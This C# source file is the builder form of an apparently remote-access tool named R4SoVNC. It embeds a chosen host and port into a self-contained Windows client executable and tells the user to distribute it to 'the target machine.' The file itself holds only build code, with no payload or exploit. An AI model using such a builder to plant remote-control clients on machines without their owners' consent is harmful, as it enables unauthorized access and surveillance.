using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using R4SoVNC.Server.Helpers;

namespace R4SoVNC.Server.Forms
{
    public partial class BuilderForm : Form
    {
        public BuilderForm()
        {
            InitializeComponent();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            string host = txtHost.Text.Trim();
            string portStr = txtPort.Text.Trim();
            string outputName = txtOutputName.Text.Trim();

            if (string.IsNullOrEmpty(host))
            {
                ShowError("Please enter the server host/IP address.");
                return;
            }
            if (!int.TryParse(portStr, out int port) || port < 1 || port > 65535)
            {
                ShowError("Please enter a valid port number (1–65535).");
                return;
            }
            if (string.IsNullOrEmpty(outputName))
            {
                ShowError("Please enter an output filename.");
                return;
            }

            if (!outputName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                outputName += ".exe";

            BuildClient(host, port, outputName);
        }

        private void BuildClient(string host, int port, string outputName)
        {
            pnlProgress.Visible = true;
            lblBuildStatus.Text = "Building...";
            btnBuild.Enabled = false;

            string clientProjectPath = FindClientProject();
            if (clientProjectPath == null)
            {
                ShowError("Could not find R4SoVNC.Client project. Make sure the solution is intact.");
                pnlProgress.Visible = false;
                btnBuild.Enabled = true;
                return;
            }

            string outputDir = Path.Combine(
                Path.GetDirectoryName(Application.ExecutablePath)!,
                "Builds");
            Directory.CreateDirectory(outputDir);

            string configFile = Path.Combine(clientProjectPath, "config.gen.txt");
            File.WriteAllText(configFile, $"{host}\n{port}");

            string outputPath = Path.Combine(outputDir, outputName);

            var psi = new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"publish \"{clientProjectPath}\" -c Release -r win-x64 --self-contained true -o \"{outputDir}\" /p:AssemblyName={Path.GetFileNameWithoutExtension(outputName)}",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
            proc.Exited += (s, e) =>
            {
                this.Invoke(() =>
                {
                    btnBuild.Enabled = true;
                    pnlProgress.Visible = false;
                    if (proc.ExitCode == 0)
                    {
                        lblBuildStatus.Text = "Build successful!";
                        lblBuildStatus.ForeColor = Theme.Success;
                        MessageBox.Show(
                            $"Client built successfully!\n\nOutput: {outputDir}\\{outputName}\n\nDistribute this file to the target machine.",
                            "Build Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        if (chkOpenFolder.Checked)
                            Process.Start("explorer.exe", outputDir);
                    }
                    else
                    {
                        lblBuildStatus.Text = "Build failed!";
                        lblBuildStatus.ForeColor = Theme.Danger;
                        string err = proc.StandardError.ReadToEnd();
                        MessageBox.Show($"Build failed:\n\n{err}", "Build Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    proc.Dispose();
                });
            };

            try { proc.Start(); }
            catch (Exception ex)
            {
                btnBuild.Enabled = true;
                pnlProgress.Visible = false;
                ShowError($"Failed to run dotnet build:\n{ex.Message}\n\nMake sure .NET 6 SDK is installed.");
            }
        }

        private string? FindClientProject()
        {
            // Try relative to running exe
            string[] candidates =
            {
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, @"..\..\..\..\R4SoVNC.Client"),
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, @"..\R4SoVNC.Client"),
                Path.Combine(Environment.CurrentDirectory, "R4SoVNC.Client"),
            };
            foreach (var c in candidates)
            {
                string normalized = Path.GetFullPath(c);
                if (File.Exists(Path.Combine(normalized, "R4SoVNC.Client.csproj")))
                    return normalized;
            }
            return null;
        }

        private void ShowError(string msg) =>
            MessageBox.Show(msg, "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);

        private void btnBrowseOutput_Click(object sender, EventArgs e)
        {
            using var sfd = new SaveFileDialog
            {
                Title = "Save Client Executable",
                Filter = "Executable|*.exe",
                FileName = txtOutputName.Text
            };
            if (sfd.ShowDialog() == DialogResult.OK)
                txtOutputName.Text = Path.GetFileName(sfd.FileName);
        }
    }
}
